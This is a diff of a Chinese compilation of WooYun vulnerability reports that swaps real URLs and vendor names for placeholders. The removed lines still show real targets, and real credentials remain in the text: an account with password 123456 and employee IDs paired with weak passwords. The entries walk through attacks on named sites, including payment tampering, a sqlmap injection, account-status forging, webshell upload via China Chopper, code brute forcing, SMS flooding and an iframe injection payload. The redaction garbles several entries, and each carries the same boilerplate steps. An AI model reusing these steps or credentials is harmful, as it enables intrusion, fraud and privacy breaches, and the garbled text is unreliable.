 **详情**: 本来呢，想找支付漏洞的，充值1W，改表单成1元，建行付款，成功付款了。返回商家的时候给个提示，说金额不符～，接着，我又来了一次，填金额的点提交之后条到一个地址，看这地址后面的整数，我加了一个邪恶的单引号，接着。。就邪恶了。。。
 
-**POC**: [ufo@UFO /tmp] $ sqlmap -u "http://www.now.cn/payment/order.net?IDAPayment=1312840" --batch --threads 10sqlmap/1.0-dev-b7429dc - automatic SQL injection and database takeover toolhttp://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It 
+**POC**: [ufo@UFO /tmp] $ sqlmap -u "https://example.com/[已脱敏]" --batch --threads 10sqlmap/1.0-dev-b7429dc - automatic SQL injection and database takeover toolhttps://example.com/[已脱敏]] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It 
 
 **绕过**: 直接利用
 
@@ -6067,7 +6067,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先site:gov.cn  inurl:WCMTRS 的内容管理系统是国内政府网站使用最多的系统之一如上面所说：外交部 http://wcm.fmprc.gov.cn/wcm/网址加上：wcm/console/auth/reg_newuser.jsphttp://localhost:9999/wcm/console/auth/reg_newuser.jsp注册，注意使用fireBUG修改表单，注意下图即将随意表单改成  STATUS 值为 30，或增加STATUS字段表单。然后提交注册虽然说是“请等待开通！”，但实际上已经开通了，因为 STATUS 字段让我们改成正常了。直接登陆虽然没什么权限，但后台存在大量注入等漏洞如：可以通过注入直接操作数据库了。http://localhost:9999/wcm/file/read_file.jsp?FileName=U02012062838349
+**详情**: 首先site:gov.cn  inurl:WCMTRS 的内容管理系统是国内政府网站使用最多的系统之一如上面所说：外交部 https://example.com/[已脱敏]  STATUS 值为 30，或增加STATUS字段表单。然后提交注册虽然说是“请等待开通！”，但实际上已经开通了，因为 STATUS 字段让我们改成正常了。直接登陆虽然没什么权限，但后台存在大量注入等漏洞如：可以通过注入直接操作数据库了。http://localhost:9999/wcm/file/read_file.jsp?FileName=U02012062838349
 
 **POC**: 上面说过了。
 
@@ -6089,7 +6089,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主站，http://www.aybmw.com/分站http://vote.aybm.cn/siteserver cms 密码找回漏洞网址：http://vote.aybm.cn/siteserver/forgetPassword.aspx关闭js用户名：admin然后一直下一步出现下图：然后登陆后台，模板添加一句话，菜刀连接
+**详情**: 主站，https://example.com/[已脱敏] cms 密码找回漏洞网址：https://example.com/[已脱敏]
 
 **POC**: 菜刀连接反查下ip是个群站，有23个网址解析到该服务器ip，公司的，政府的，邮箱，而且，PR值都有4到5看下数据库：这么多网站数据库，感觉安阳市数据尽收眼底，数据泄露的话可不好了
 
@@ -6111,7 +6111,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 会员登陆站点https://login.homeinns.com逻辑验证问题，当输入用户名：'x 密码x的时候即可成功登录，多次尝试可进入不同的账户目测有注入，就不继续玩蛋了，洗洗睡觉了，明天还的去搬砖。不少的金卡用户和积分、用户敏感信息（如身份证、手机号码、QQ邮箱等），可精确定位，精确打击。。。http://www.homeinns.com/Test  都被大牛黑了啊 亲 还有你旗下的莫泰那些子站都挂满了。。招个搞安全的好好整整
+**详情**: 会员登陆站点https://example.com/[已脱敏]'x 密码x的时候即可成功登录，多次尝试可进入不同的账户目测有注入，就不继续玩蛋了，洗洗睡觉了，明天还的去搬砖。不少的金卡用户和积分、用户敏感信息（如身份证、手机号码、某互联网公司邮箱等），可精确定位，精确打击。。。https://example.com/[已脱敏]  都被大牛黑了啊 亲 还有你旗下的莫泰那些子站都挂满了。。招个搞安全的好好整整
 
 **POC**: (见原文)
 
@@ -6133,7 +6133,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://www.igreenjsq.info/openvpn/.bash_historyls -lrtpwdls -lrtcd /var/www/joomlacn/openvpn/Open_UDP/sed -i 's#port 853#port 753#g' *U.ovpncd /var/www/joomlacn/openvpn/rm -rf openvpn.zipzip -r openvpn.zip Open*cd /var/www/joomlacn/openvpn/Open_UDP/sed -i 's#port 853#port 753#g' *U.ovpnls -acd /var/www/joomlacn/openvpn/rm -rf openvpn.zipzip -r openvpn.zip Open*cd /var/www/joomlacn/openvpn/Open_UD
+**详情**: https://example.com/[已脱敏] -lrtpwdls -lrtcd /var/www/joomlacn/openvpn/Open_UDP/sed -i 's#port 853#port 753#g' *U.ovpncd /var/www/joomlacn/openvpn/rm -rf openvpn.zipzip -r openvpn.zip Open*cd /var/www/joomlacn/openvpn/Open_UDP/sed -i 's#port 853#port 753#g' *U.ovpnls -acd /var/www/joomlacn/openvpn/rm -rf openvpn.zipzip -r openvpn.zip Open*cd /var/www/joomlacn/openvpn/Open_UD
 
 **POC**: rs
 
@@ -6155,7 +6155,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、接口配置不当，遍历接口可直接脱库，应该有上百万此处接口只是为了让用户确认账号信息，但是带出来了太多隐私数据http://www.xj96566.com/IOC/thread/business!getBossUserData.action?cardnum=41116810002、业务逻辑设计有缺陷，可直接用此处账号和查询出来的姓名登陆办理业务，此处如被程序自动化掉，后果很严重。（此处用4111681000账号测试了下在线订购，结果成功了，你们看到了，帮给取消下吧）两处任意一处被程序自动化的话，后果都很严重。
+**详情**: 1、接口配置不当，遍历接口可直接脱库，应该有上百万此处接口只是为了让用户确认账号信息，但是带出来了太多隐私数据https://example.com/[已脱敏]
 
 **POC**: 1、没什么好证明的，遍历接口跑就是了，什么限制都没。2、登陆的验证码都是可以复用的，用过没做销毁，手动输一次之后就可以自动化了，业务办理走的也是接口，可以批量操作，就不证明了
 
@@ -6265,7 +6265,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 优购网首页：http://www.yougou.com密码找回地址：http://www.yougou.com/forgotpassword.jhtml情况1：手机验证码处，只有4个数字，很容易被暴力破解，不过服务器端有对网络恶意行为的检测，猜解到一定次数会限制ip访问。方法是可以通过变换代理ip地址来绕过，理论如此，实际攻击起来有难度。情况2：是常见的逻辑漏洞导致密码找回的验证码可以发送到任意手机。1、点登录选择忘记密码，输入手机号2、到如下页面：3、此时截包，然后点击下一步。截取到这个POST连接时，修改body里的phone数据为你自己想要接收验证码的电话。然后放行4、你的手机号就收到了验证码，可以输入改密码了。5、修改成功主要是一种逻辑上的失误，接收验证码的手机怎么能在客户端传上去呢。
+**详情**: 优购网首页：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6275,8 +6275,8 @@
 ---
 
 ---
-### [wooyun-2013-025962] 百度网游存在支付漏洞
-**厂商**: 百度 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-025962] 某搜索引擎网游存在支付漏洞
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -6287,9 +6287,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1：大家都玩游仙吗  http://youxi.baidu.com/yx/select/2:用百度币给网游充值：3：多充点10000元吧：
+**详情**: 1：大家都玩游仙吗  https://example.com/[已脱敏]
 
-**POC**: 4：用burpsuit拦截：5：将百度币参数amount=10000改为1：6：所支付的百度币为1元
+**POC**: 4：用burpsuit拦截：5：将某搜索引擎币参数amount=10000改为1：6：所支付的某搜索引擎币为1元
 
 **绕过**: 直接利用
 
@@ -6309,7 +6309,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x01 说明我之前用于测试，注册了两个账号一个叫做admin另一个叫做wooyuners0x02 开始在登录页面点击"找回密码"输入用户名，填写验证码。作为用户凭证验证用户名存在之后，开始验证邮箱之后点击确定按钮开始跳转，应该是发送邮件到邮箱瞬间，发现有"异物"明文的……我擦？赶紧去邮箱看看到底是神马内容邮箱里面的也是明文。http://fudanwang.com/user/repassword?email=14xxxx2@qq.com&username=wooyuners不管他了，先试试看。复制到浏览器打开重设密码这样也可以？登录进去0x03 验证校验只需要邮箱账号跟用户名就行了？于是再注册了个账号，看看直接用账号跟用户名能否找回http://fudanwang.com/user/repassword?email=5xxxxxx3@qq.com&username=admin直接浏览器打
+**详情**: 0x01 说明我之前用于测试，注册了两个账号一个叫做admin另一个叫做wooyuners0x02 开始在登录页面点击"找回密码"输入用户名，填写验证码。作为用户凭证验证用户名存在之后，开始验证邮箱之后点击确定按钮开始跳转，应该是发送邮件到邮箱瞬间，发现有"异物"明文的……我擦？赶紧去邮箱看看到底是神马内容邮箱里面的也是明文。https://example.com/[已脱敏] 验证校验只需要邮箱账号跟用户名就行了？于是再注册了个账号，看看直接用账号跟用户名能否找回https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6331,13 +6331,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录酒仙网，然后点击左上角的请登录，然后选择合作账号微博登录，在登录界面时候点取消，然后自动跳转到酒仙网首页，竟然页面自动登录任意一位的用户账号，目测账号余额很多。。。泄露过程如图：
+**详情**: 登录酒仙网，然后点击左上角的请登录，然后选择合作账号某社交平台登录，在登录界面时候点取消，然后自动跳转到酒仙网首页，竟然页面自动登录任意一位的用户账号，目测账号余额很多。。。泄露过程如图：
 
 **POC**: 泄露过程如图：
 
 **绕过**: 直接利用
 
-**修复**: 微博合作登录调整机制
+**修复**: 某社交平台合作登录调整机制
 ---
 
 ---
@@ -6353,7 +6353,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 提交订单号 订单号和金额分开http://www.mob.com/pay/alipay/sms?id=2015102049985453&amount=1订单金额直接修改
+**详情**: 提交订单号 订单号和金额分开https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6385,8 +6385,8 @@
 ---
 
 ---
-### [wooyun-2014-080771] 中国联通实名认证平台严重缺陷(可导致海量身份证信息泄露)
-**厂商**: 中国联通 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-080771] 某运营商实名认证平台严重缺陷(可导致海量身份证信息泄露)
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -6397,7 +6397,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某天本屌逛京东买个流量卡,怎奈本屌是穷屌 所以看来看去看到某张卡的介绍详情里包括了 如下信息实名网址：http://www.wom186.com/smzdj实名账号：5103894881 密码：123456好了正题.0x1首先映入眼帘的是帐号登录系统. 这里的逻辑是首先验证用户名是否存在与系统如果存在继续输入密码0x2下一步会把该管理员的所有信息输出出来. 当然包括没加盐的MD5(PWD)```` 都没想到现在还有这么写的..```再一次, 此处验证码形同虚设.联通的管理员帐号是系统生成的所以都是一个挨着一个的, 所以根据图二的POST,我用脚写了一段code,跑了几个小时抓到了2W6多个管理员信息.输出password`没加盐的md5实在太好破了!据完全统计 96%的管理员密码都成功配对.(不要抓我`` 马山就删)我随便登录一个好伐`` 用户数据我没敢跑.1500多条用户身份证信息看到这
+**详情**: 某天本屌逛某电商平台买个流量卡,怎奈本屌是穷屌 所以看来看去看到某张卡的介绍详情里包括了 如下信息实名网址：https://example.com/[已脱敏] 密码：123456好了正题.0x1首先映入眼帘的是帐号登录系统. 这里的逻辑是首先验证用户名是否存在与系统如果存在继续输入密码0x2下一步会把该管理员的所有信息输出出来. 当然包括没加盐的MD5(PWD)```` 都没想到现在还有这么写的..```再一次, 此处验证码形同虚设.联通的管理员帐号是系统生成的所以都是一个挨着一个的, 所以根据图二的POST,我用脚写了一段code,跑了几个小时抓到了2W6多个管理员信息.输出password`没加盐的md5实在太好破了!据完全统计 96%的管理员密码都成功配对.(不要抓我`` 马山就删)我随便登录一个好伐`` 用户数据我没敢跑.1500多条用户身份证信息看到这
 
 **POC**: 上面``
 
@@ -6419,9 +6419,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出在这里http://kuaidadi.com/phone/填了号码，点击获取验证码，然后手机就会收到短信验证码，同时，还会有电话打过来（有木有很可怕）可以看到界面上是做了限制，60秒才可以发送一次但是吧，其实，唉用burp一下，然后用repeater，持续发送，发现还是可以一直发送的。图中可以看到status状态为1，意思为发送成功。电话就会一直打过来了，吓尿了。
+**详情**: 问题出在这里https://example.com/[已脱敏]
 
-**POC**: 问题出在这里http://kuaidadi.com/phone/填了号码，点击获取验证码，然后手机就会收到短信验证码，同时，还会有电话打过来（有木有很可怕）可以看到界面上是做了限制，60秒才可以发送一次但是吧，其实，唉用burp一下，然后用repeater，持续发送，发现还是可以一直发送的。图中可以看到status状态为1，意思为发送成功。电话就会一直打过来了，吓尿了。
+**POC**: 问题出在这里https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6551,7 +6551,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 思路来源：WooYun: QQ浏览器等设计不当可导致用户密码被窃取危害1: 有些网站例如 sinaapp.com ，它的子域名都是由不同开发者开发的，如果有一个开发者恶意在页面中嵌入许多其他该域名下的隐藏登录表单，而用户又保存了该网站的密码，则该密码会自动填写进去。危害2：只要某域名有某个子站沦陷，攻击者无需利用COOKIE等就可以直接获得保存密码表单的用户的密码。这里为了方便演示，我直接就借用作者的网站了，也懒得构造代码了。
+**详情**: 思路来源：WooYun: 某互联网公司浏览器等设计不当可导致用户密码被窃取危害1: 有些网站例如 sinaapp.com ，它的子域名都是由不同开发者开发的，如果有一个开发者恶意在页面中嵌入许多其他该域名下的隐藏登录表单，而用户又保存了该网站的密码，则该密码会自动填写进去。危害2：只要某域名有某个子站沦陷，攻击者无需利用COOKIE等就可以直接获得保存密码表单的用户的密码。这里为了方便演示，我直接就借用作者的网站了，也懒得构造代码了。
 
 **POC**: 1.访问360tc.sinaapp.com， 填写用户名密码，点登录并保存。2.访问360chi.sinaapp.com， 点按钮，便会显示隐藏表单中的密码。可以看到不同的二级域名，却把用户密码完整的读取出来了。
 
@@ -6575,7 +6575,7 @@
 
 **详情**: 在人人中发布一篇日志，期中含有html代码，在人人桌面中就会一网页方式解析这些代码，这样如果发布一个带有挂马代码或者其他恶意代码的日志，就会对通过人人桌面程序阅读或者回复这篇日志的用户完成一次攻击。
 
-**POC**: 先在人人中发布一篇日志内容为:<html><head><title>test</title></head><body><iframe src="http:\\www.baidu.com" weight="200" height="500"></iframe></body></html>发布后我们可以看到，在人人网页中文字没有问题（图1），而在我的好友的人人桌面中打开这篇日志（图2），可以看到代码被成功解析了，把百度的地址换成网页木马的地址，当好友用人人桌面访问时一次挂马攻击就完成了。图1图2
+**POC**: 先在人人中发布一篇日志内容为:<html><head><title>test</title></head><body><iframe src="http:\\www.baidu.com" weight="200" height="500"></iframe></body></html>发布后我们可以看到，在人人网页中文字没有问题（图1），而在我的好友的人人桌面中打开这篇日志（图2），可以看到代码被成功解析了，把某搜索引擎的地址换成网页木马的地址，当好友用人人桌面访问时一次挂马攻击就完成了。图1图2
 
 **绕过**: 直接利用
 
@@ -6685,7 +6685,7 @@
 
 **详情**: 首先，在艺龙随便下了一个订单，到支付页面，选择信用卡支付输入正确的卡号，有效期姓名，身份证等相关信息随便输居然支付成功了。那么问题来了说明这里只判断信用卡有效期即可成功支付接下来就简单了，我们只要尝试爆破出信用卡的有效期即可然后发现错误的有效期也能使订单到判定支付是否成功的阶段
 
-**POC**: 所以。下多个订单随便点击一个订单到支付页面抓包POST /epay/isajax/CreditCardExtend/Save HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: https://secure.elong.com/epay/cn/creditcardextend/433877263696341615trainAccept: application/json, text/javascript, */*Content-Type: application/x-www-form-urlencoded
+**POC**: 所以。下多个订单随便点击一个订单到支付页面抓包POST /epay/isajax/CreditCardExtend/Save HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: https://example.com/[已脱敏] application/json, text/javascript, */*Content-Type: application/x-www-form-urlencoded
 
 **绕过**: 直接利用
 
@@ -6737,8 +6737,8 @@
 ---
 
 ---
-### [wooyun-2014-059130] 一个exe让百度杀毒所有防护功能失效(再现灰鸽子)
-**厂商**: 百度 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-059130] 一个exe让某搜索引擎杀毒所有防护功能失效(再现灰鸽子)
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 上传功能
 
@@ -6749,7 +6749,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 希望此次劳动成果能够被适当尊重！思路与之前公布的漏洞是一样的，启发式查杀和主动防御在不同的两个逻辑层面进行系统防护，但都依靠对恶意软件的恶意行为来进行查杀，如果恶意行为被分散在不同的逻辑层面上，将会令这两大防御功能同时失效。不知道这样写是不是没表达清楚这个漏洞的本质，重点在于“恶意行为的分散”这句话上面。我们所建立的查杀模型大多都是基于一个独立进程，但黑客完全可以把一些恶意行为分散在不同进程中，这样每个进程似乎都是没问题的，组合到一起问题就大了去了！这个问题不仅仅存在于百度杀毒身上，大多数杀软都有这个问题。这次的演示程序运行过后将直接停止杀软所有的防护功能，然后为了证明恶意行为可以为所欲为，我特意找到了好久以前的经典木马--灰鸽子。杀软被停掉防护功能后在上面跑灰鸽子没有任何报警或者拦截。方法是这样的，我们首先筛选一些百度本身并不会查杀的“可信程序”，这些可信程序具备强大的系统管理功能，例如
+**详情**: 希望此次劳动成果能够被适当尊重！思路与之前公布的漏洞是一样的，启发式查杀和主动防御在不同的两个逻辑层面进行系统防护，但都依靠对恶意软件的恶意行为来进行查杀，如果恶意行为被分散在不同的逻辑层面上，将会令这两大防御功能同时失效。不知道这样写是不是没表达清楚这个漏洞的本质，重点在于“恶意行为的分散”这句话上面。我们所建立的查杀模型大多都是基于一个独立进程，但黑客完全可以把一些恶意行为分散在不同进程中，这样每个进程似乎都是没问题的，组合到一起问题就大了去了！这个问题不仅仅存在于某搜索引擎杀毒身上，大多数杀软都有这个问题。这次的演示程序运行过后将直接停止杀软所有的防护功能，然后为了证明恶意行为可以为所欲为，我特意找到了好久以前的经典木马--灰鸽子。杀软被停掉防护功能后在上面跑灰鸽子没有任何报警或者拦截。方法是这样的，我们首先筛选一些某搜索引擎本身并不会查杀的“可信程序”，这些可信程序具备强大的系统管理功能，例如
 
 **POC**: 这次也不截图了，直接录视频，看的仔细看的透彻！
 
@@ -6793,7 +6793,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:KonkaSellUnReport.do?method=list&username=获得http://qdgl.konka.com/webservice/KonkaSellUnReport.do?method=list&username=%E8%91%A3%E6%9C%9D%E8%BE%89&__username=%E8%91%A3%E6%9C%9D%E8%BE%89&user_id=39375&userpass=0&__password=0其中用户名就是董朝辉密码为0====================================登录口：http://qdgl.konka.com/login.do
+**详情**: inurl:KonkaSellUnReport.do?method=list&username=获得https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6815,7 +6815,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用的是官方程序：http://tg.tttuangou.net详细过程有截图话就不多说大家都能看懂！跪求邀请码，谢谢
+**详情**: 用的是官方程序：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6837,7 +6837,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://payen.eyougame.com/在检索网站的时候 检索到这个子域名 说实话 这个子域名到底干什么的没弄明白 好像是为游戏充值的？我们抓包这里以密码为 123456 为例 丢入 burp 里跑下账号字典账号 密码 匹配正确的 返回状态为 302 错误则为 200（这里我排除了错误状态下的账号）我们随便登录几个账号至主域名 试试 看看正确不正确
+**详情**: https://example.com/[已脱敏] 检索到这个子域名 说实话 这个子域名到底干什么的没弄明白 好像是为游戏充值的？我们抓包这里以密码为 123456 为例 丢入 burp 里跑下账号字典账号 密码 匹配正确的 返回状态为 302 错误则为 200（这里我排除了错误状态下的账号）我们随便登录几个账号至主域名 试试 看看正确不正确
 
 **POC**: 以下账号密码均为：123456mask 区域*****da**********4**********123**********le**********em**********he**********od**********at**********03**********hu**********on**********ley**********en**********ri**********us**********ar**********45**********TC**********of**********ma**********ard**********io**********ol*****
 
@@ -6859,7 +6859,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.中国南方航空飞行数据应用系统找回密码存在设计缺陷,验证码可猜解爆破抓包爆破4位验证码，admin账户被重置，密码为1111@qqqq，如下图，重置成功
+**详情**: 1.中国南方航空飞行数据应用系统找回密码存在设计缺陷,验证码可猜解爆破抓包爆破4位验证码，admin账户被重置，密码为1111@某互联网公司某互联网公司，如下图，重置成功
 
 **POC**: 登陆进去，全公司组织架构，员工信息全部泄露，包括手机，邮箱，工号等等部门事件管理飞行计划文件飞行健康管理可管理内部论坛机组事件内部文件角色管理日志管理数据监控管理
 
@@ -6903,7 +6903,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://hr1.wahaha.com.cn/ 下存在大量弱口令用户，大约60多个员工的工资，身份证，电话，职位，学历，姓名等信息泄露53405185719731739884902764185916091623109610695211033189393642339484154197322552595996823317381378904210827469359305290619221929199227513651105213531655961093971049120909619196459722948896149686101227069284以上工号密码为1234562592341以上工号密码为123123285123012431214393602096以上工号密码为111111/ajax/memberCheck.do 爆破工号利用的是这个接口/ajax/memberLogin.do 爆
+**详情**: https://example.com/[已脱敏] 下存在大量弱口令用户，大约60多个员工的工资，身份证，电话，职位，学历，姓名等信息泄露53405185719731739884902764185916091623109610695211033189393642339484154197322552595996823317381378904210827469359305290619221929199227513651105213531655961093971049120909619196459722948896149686101227069284以上工号密码为1234562592341以上工号密码为123123285123012431214393602096以上工号密码为111111/ajax/memberCheck.do 爆破工号利用的是这个接口/ajax/memberLogin.do 爆
 
 **POC**: (见原文)
 
@@ -6913,8 +6913,8 @@
 ---
 
 ---
-### [wooyun-2013-024343] QQ2013检测好友是否隐身的一个方法
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-024343] 某互联网公司2013检测好友是否隐身的一个方法
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -6925,7 +6925,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯在新版本的QQ中加入了离线发送文件后“撤回”功能。也就是说当文件离线发送成功后可以撤回，这样对方就不收到该文件。但是现在的情况是，如果对方隐身，那么你在点击“撤回”按钮后将提示无法撤回。而对方真正离线则可以退回。这样通过给隐身好友发送离线文件，然后马上点击撤回，就可以根据结果判断对方是否在线。这应该算是一个不是BUG的BUG。但有时真的会造成一定的误会与尴尬。
+**详情**: 某互联网公司在新版本的某互联网公司中加入了离线发送文件后“撤回”功能。也就是说当文件离线发送成功后可以撤回，这样对方就不收到该文件。但是现在的情况是，如果对方隐身，那么你在点击“撤回”按钮后将提示无法撤回。而对方真正离线则可以退回。这样通过给隐身好友发送离线文件，然后马上点击撤回，就可以根据结果判断对方是否在线。这应该算是一个不是BUG的BUG。但有时真的会造成一定的误会与尴尬。
 
 **POC**: (见原文)
 
@@ -6935,8 +6935,8 @@
 ---
 
 ---
-### [wooyun-2014-080788] QQ输入法纯净版1.1   存在输入法漏洞
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-080788] 某互联网公司输入法纯净版1.1   存在输入法漏洞
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -6991,7 +6991,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 只有安装了360软件 任意浏览器打开下面链接即可zhushou360://type=apk&name=360影视大全&refer=360se&icon=http://p5.qhimg.com/t0193ee0bd27701a112.png&url=http://softfile.3g.qq.com/msoft/179/1105/91281/qq_4.6.2.2125_android.apkname 和url ico 可以任意修改相比WooYun: 360手机助手任意应用下载欺诈安装此次无确认框  直接加入助手下载的 所以危害还大点
+**详情**: 只有安装了360软件 任意浏览器打开下面链接即可zhushou360://type=apk&name=360影视大全&refer=360se&icon=https://example.com/[已脱敏] 和url ico 可以任意修改相比WooYun: 360手机助手任意应用下载欺诈安装此次无确认框  直接加入助手下载的 所以危害还大点
 
 **POC**: (见原文)
 
@@ -7057,9 +7057,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.同程旅游Android客户端组件com.tongcheng.android.TongchengMainUIActivity是导出的2.该组件接受了redirecturl参数，该参数是攻击者可控制的，具体请见测试代码，这里我控制的url以百度为例，也可以是任意的钓鱼网站3.通过控制该链接发送钓鱼链接窃取用户隐私信息或账号密码，甚至是支付宝、网银等密码，由于是在同程客户端打开的，大部分用户会中招的且认为是同程的问题
+**详情**: 1.同程旅游Android客户端组件com.tongcheng.android.TongchengMainUIActivity是导出的2.该组件接受了redirecturl参数，该参数是攻击者可控制的，具体请见测试代码，这里我控制的url以某搜索引擎为例，也可以是任意的钓鱼网站3.通过控制该链接发送钓鱼链接窃取用户隐私信息或账号密码，甚至是某电商平台、网银等密码，由于是在同程客户端打开的，大部分用户会中招的且认为是同程的问题
 
-**POC**: 这里以百度为例了，其实可以加载所有的网站，包括做什么事情大家都懂的，在同程一个这样重视钓鱼安全的网站危害我就不具体描述了左右上角绿色的后退按钮和转发按钮同程的同事应该很清楚啦
+**POC**: 这里以某搜索引擎为例了，其实可以加载所有的网站，包括做什么事情大家都懂的，在同程一个这样重视钓鱼安全的网站危害我就不具体描述了左右上角绿色的后退按钮和转发按钮同程的同事应该很清楚啦
 
 **绕过**: 直接利用
 
@@ -7079,9 +7079,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://client.3g.soufun.com/http/wap/appdownload/download_sfb.html这里下面有个发送链接至手机号码！默认发送次数为5次，安卓机可发5次，iPhone可发5次。超过次数后记录手机号码，则提示发送失败！输入手机号抓包：http://client.3g.soufun.com/http/pgservice.jsp?dst=这里是手机号码&messagename=sentmessage&product=soufunbang&time=0.9652428204202439get包，看下包的内容，手机号码与后面messagename中间有个衔接符号“&”。发包时此符号被过滤默认成为衔接字符。然后我们在手机号码后加个&再点发送！抓包：http://client.3g.soufun.com/http/pgservice.jsp?dst=这里是手
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://client.3g.soufun.com/http/wap/appdownload/download_sfb.html这里下面有个发送链接至手机号码！默认发送次数为5次，安卓机可发5次，iPhone可发5次。超过次数后记录手机号码，则提示发送失败！输入手机号抓包：http://client.3g.soufun.com/http/pgservice.jsp?dst=这里是手机号码&messagename=sentmessage&product=soufunbang&time=0.9652428204202439get包，看下包的内容，手机号码与后面messagename中间有个衔接
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -7103,7 +7103,7 @@
 
 **详情**: 今天在设置了密码锁的时候，发现在锁屏页面，不要去上下左右滑动，而是连续按两下屏幕锁屏的中心点。重复2-3次，就会发现莫名其妙的启动了手机里面的音乐程序（这个是miui自带音乐播放器的界面），然后在按两下锁屏键，就会发现一个似曾相识的界面，没错，就是第三方音乐播放器的锁屏页面，好奇葩的一个设计。（这里需要注意的是，在启动之前是没有任何后台程序在运行的！）然后，后面的事情我就不用在多说了，就可以任意操作用户手机了，方法详见WooYun: 小米MIUI安全锁形同虚设（可以绕过后任意操作手机）
 
-**POC**: 漏洞证明视频，包括数字密码锁和图案密码锁状态下的演示。（这里视频只是证明可以在锁屏状态启动第三方音乐播放器，至于后续的利用第三方音乐播放器绕过手机安全锁的视频，请看这个帖子WooYun: 小米MIUI安全锁形同虚设（可以绕过后任意操作手机））：密码：wooyun优酷视频地址：http://v.youku.com/v_show/id_XNjE4MDY4MjMy.html危害：比起之前的那个漏洞WooYun: 小米MIUI安全锁形同虚设（可以绕过后任意操作手机）更加严重！因为之前的漏洞是需要用户后台有在运行第三方音乐播放器或者第三方锁屏程序的的。而这个漏洞由于小米的这个比较奇葩的设计，会直接启动第
+**POC**: 漏洞证明视频，包括数字密码锁和图案密码锁状态下的演示。（这里视频只是证明可以在锁屏状态启动第三方音乐播放器，至于后续的利用第三方音乐播放器绕过手机安全锁的视频，请看这个帖子WooYun: 小米MIUI安全锁形同虚设（可以绕过后任意操作手机））：密码：wooyun优酷视频地址：https://example.com/[已脱敏] 小米MIUI安全锁形同虚设（可以绕过后任意操作手机）更加严重！因为之前的漏洞是需要用户后台有在运行第三方音乐播放器或者第三方锁屏程序的的。而这个漏洞由于小米的这个比较奇葩的设计，会直接启动第
 
 **绕过**: 过滤绕过
 
@@ -7111,8 +7111,8 @@
 ---
 
 ---
-### [wooyun-2012-08679] 网易邮箱-手机验证存在业务缺陷
-**厂商**: 网易 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2012-08679] 某互联网公司邮箱-手机验证存在业务缺陷
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -7123,7 +7123,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 端午节快乐哈。说明下：这是个bug，不是安全漏洞(如果围观者为了看漏洞，那请移步吧...(^__^))，但关系到用户账号和业务逻辑，加上一个宅男节日无事做，再加上是网易的铁杆用户，so...提交到wooyun吧。入正题：再次发送手机短信验证码；验证手机时；未将上次所发的验证码销毁。http://reg.163.com/mibao/controller/mob/index.jsp通过这个页面登陆进入邮箱手机验证(经测试进入邮箱-账户设置处是不存在此bug的...)；
